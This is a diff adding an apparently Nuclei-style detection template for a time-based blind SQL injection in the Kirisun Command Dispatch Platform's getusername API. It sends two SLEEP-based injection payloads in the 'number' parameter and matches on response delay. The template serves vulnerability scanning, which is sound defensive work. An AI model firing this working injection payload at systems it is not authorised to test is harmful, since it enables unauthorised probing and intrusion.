@@ -1,0 +1,43 @@
+id: kirisun-getusername-sqli
+info:
+  name: Kirisun Command Dispatch Platform /api/client/getusername SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Vulnerability in the Kirisun Command Dispatch Management Platform allowing SQL injection through the `number` parameter in the `getusername` API endpoint.
+
+variables:
+  t1: "{{rand_int(6,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+  t3: "{{rand_int(1,4)}}"
+  t4: "{{to_number(t3) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "/api/client/getusername.php?number=1%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{t1}})))FIjE)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "current_duration >= to_number(t1)"
+          - "current_duration <= to_number(t2)"
+          - "!contains(body, '<')"
+
+  - method: GET
+    path:
+      - "/api/client/getusername.php?number=1%20AND%20(SELECT%205443%20FROM%20(SELECT(SLEEP({{t3}})))FIjE)"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "current_duration >= to_number(t3)"
+          - "current_duration <= to_number(t4)"
+          - "!contains(body, '<')"
